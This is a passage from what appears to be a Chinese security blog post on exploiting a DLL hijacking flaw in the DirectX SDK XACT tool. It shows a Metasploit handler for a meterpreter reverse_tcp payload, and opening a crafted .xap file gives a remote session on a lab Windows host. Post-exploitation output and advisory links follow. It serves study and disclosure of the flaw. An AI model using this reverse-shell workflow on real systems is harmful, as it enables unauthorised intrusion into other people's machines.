+</span></span></code></pre></div><p>MSF配置：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; show options
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/multi/handler<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   Name  Current Setting  Required  Description
+</span></span><span style=display:flex><span>   ----  ---------------  --------  -----------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>windows/meterpreter/reverse_tcp<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
+</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
+</span></span><span style=display:flex><span>   EXITFUNC  process          yes       Exit technique <span style=color:#f92672>(</span>Accepted: <span style=color:#e6db74>&#39;&#39;</span>, seh, thread, process, none<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>   LHOST     192.168.137.79   yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>   LPORT     <span style=color:#ae81ff>4444</span>             yes       The listen port
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Exploit target:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   Id  Name
+</span></span><span style=display:flex><span>   --  ----
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Wildcard Target
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; exploit -j
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 2.
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt;
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 192.168.137.79:4444
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt;
+</span></span></code></pre></div><p>创建一个<code>.xap</code>文件：</p><pre tabindex=0><code>touch .xap
+</code></pre><p>打开<code>.xap</code>文件，获得会话：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2876a808-4f5f-11ec-8a46-00d861bf4abb.png alt=0x03></p></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; jobs
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Jobs
+</span></span><span style=display:flex><span><span style=color:#f92672>====</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  Id  Name                    Payload                          Payload opts
+</span></span><span style=display:flex><span>  --  ----                    -------                          ------------
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>2</span>   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.137.79:4444
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt;
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>179779</span> bytes<span style=color:#f92672>)</span> to 192.168.137.71
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>192.168.137.79:4444 -&gt; 192.168.137.71:49236<span style=color:#f92672>)</span> at 2018-08-15 18:31:59 +0800
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions -i <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; getuid
+</span></span><span style=display:flex><span>Server username: John-Thunderobt<span style=color:#ae81ff>\J</span>ohn
+</span></span><span style=display:flex><span>meterpreter &gt; background
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Backgrounding session 2...
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; show options
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/multi/handler<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   Name  Current Setting  Required  Description
+</span></span><span style=display:flex><span>   ----  ---------------  --------  -----------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>windows/meterpreter/reverse_tcp<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
+</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
+</span></span><span style=display:flex><span>   EXITFUNC  process          yes       Exit technique <span style=color:#f92672>(</span>Accepted: <span style=color:#e6db74>&#39;&#39;</span>, seh, thread, process, none<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>   LHOST     192.168.137.79   yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>   LPORT     <span style=color:#ae81ff>4444</span>             yes       The listen port
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Exploit target:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   Id  Name
+</span></span><span style=display:flex><span>   --  ----
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Wildcard Target
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt;
+</span></span></code></pre></div><h2 id=0x03-总结>0x03 总结</h2><p>本片文章主要涉及了<code>Process Monitor</code>过滤器的使用，方便快速定位指定进程。</p><p>并且复习了DLL劫持漏洞的原理，及利用方式。</p><h2 id=0x04-参考>0x04 参考</h2><ul><li><p><a href=http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DIRECTX-SDK-XACT.EXE-TROJAN-FILE-CODE-EXECUTION.txt>http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DIRECTX-SDK-XACT.EXE-TROJAN-FILE-CODE-EXECUTION.txt</a></p></li><li><p><a href="https://www.exploitalert.com/view-details.html?id=30611">https://www.exploitalert.com/view-details.html?id=30611</a></p></li><li><p><a href=https://hackertor.com/2018/08/13/microsoft-directx-sdk-june-2010-xact3-exe-dll-hijacking/>https://hackertor.com/2018/08/13/microsoft-directx-sdk-june-2010-xact3-exe-dll-hijacking/</a></p></li><li><p>&mldr;.</p></li></ul><p>其实都是一个内容，第一个是作者的文章，有很多不错的漏洞值得学习！</p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
+to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
+<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
